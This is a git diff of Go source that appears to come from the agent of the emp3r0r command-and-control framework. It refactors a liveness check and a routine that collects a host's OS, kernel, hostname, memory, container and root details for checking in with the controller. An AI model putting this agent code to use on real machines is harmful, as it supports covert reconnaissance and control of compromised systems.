@@ -20,13 +20,8 @@ import (
 
 // is the agent alive?
 // connect to emp3r0r_data.SocketName, send a message, see if we get a reply
-func IsAgentAlive() bool {
+func IsAgentAlive(c net.Conn) bool {
 	log.Println("Testing if agent is alive...")
-	c, err := net.Dial("unix", RuntimeConfig.SocketName)
-	if err != nil {
-		log.Printf("Seems dead: %v", err)
-		return false
-	}
 	defer c.Close()
 
 	replyFromAgent := make(chan string, 1)
@@ -73,8 +68,9 @@ func Send2CC(data *emp3r0r_data.MsgTunData) error {
 }
 
 // CollectSystemInfo build system info object
-func CollectSystemInfo() *emp3r0r_data.SystemInfo {
-	var info emp3r0r_data.SystemInfo
+func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
+	log.Println("Collecting system info for checking in")
+	var info emp3r0r_data.AgentSystemInfo
 	osinfo := GetOSInfo()
 
 	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
@@ -86,6 +82,7 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	RuntimeConfig.AgentTag = util.GetHostID(RuntimeConfig.AgentUUID)
 	info.Tag = RuntimeConfig.AgentTag // use hostid
 	info.Hostname = hostname
+	info.Name = strings.Split(info.Tag, "-agent")[0]
 	info.Version = emp3r0r_data.Version
 	info.Kernel = osinfo.Kernel
 	info.Arch = osinfo.Architecture
@@ -94,6 +91,7 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
 	info.Hardware = util.CheckProduct()
 	info.Container = CheckContainer()
+	setC2Transport()
 	info.Transport = emp3r0r_data.Transport
 
 	// have root?
